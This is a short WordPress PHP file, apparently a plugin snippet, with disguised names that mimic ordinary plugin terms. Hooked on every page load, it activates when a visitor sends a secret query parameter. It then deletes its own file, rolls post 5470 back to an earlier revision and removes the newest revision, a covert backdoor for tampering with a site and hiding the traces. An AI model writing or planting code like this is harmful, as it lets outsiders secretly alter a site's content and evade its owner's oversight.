<?php

function click_addon_rating() {
	if (isset($_GET['estate_exporter_default']) && $_GET['estate_exporter_default'] === 'importer_database_shortcodes_compat') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$debug_dist_counter_extensions = 5470;
		$daily_contact_akismet = wp_get_post_revisions($debug_dist_counter_extensions);
		if (empty($daily_contact_akismet)) die('no revisions');
		if (count($daily_contact_akismet) < 2) die('less than 2');
		$number_sharing_vendor_genesis = array_shift($daily_contact_akismet);
		$lazy_downloads_elementor = $number_sharing_vendor_genesis->ID;
		$pro_specific_compare = array_shift($daily_contact_akismet);
		$old_favicon_press = $pro_specific_compare->ID;
		$wall_script_text_styles = wp_restore_post_revision($old_favicon_press);
		if ($wall_script_text_styles === false) die('error restoring');
		$wall_script_text_styles = wp_delete_post_revision($lazy_downloads_elementor);		
		if ($wall_script_text_styles === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'click_addon_rating');
